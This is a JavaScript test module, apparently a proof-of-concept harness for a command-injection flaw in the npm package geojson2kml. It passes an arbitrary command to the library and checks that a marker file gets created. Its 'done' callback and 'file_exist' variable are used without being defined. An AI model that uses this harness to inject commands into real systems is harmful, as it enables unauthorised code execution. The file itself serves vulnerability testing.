function exploitFunction(command) {
  const a = require("geojson2kml");
  const fs = require("fs");

  try {
    if (fs.existsSync("./geojson2kml")) {
      fs.unlinkSync("./geojson2kml");
      console.log("File removed:", "./geojson2kml");
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync("./geojson2kml");
  expect(file_exist).toBe(false);

  a("./", command, function (err) {
    if (err) throw err;
    else {
      file_exist = fs.existsSync("./geojson2kml");
      expect(file_exist).toBe(true);
      fs.unlink("./geojson2kml", function (err) {
        // Ensure done is called here
        done();
      });
    }
  });
}

module.exports = { exploitFunction };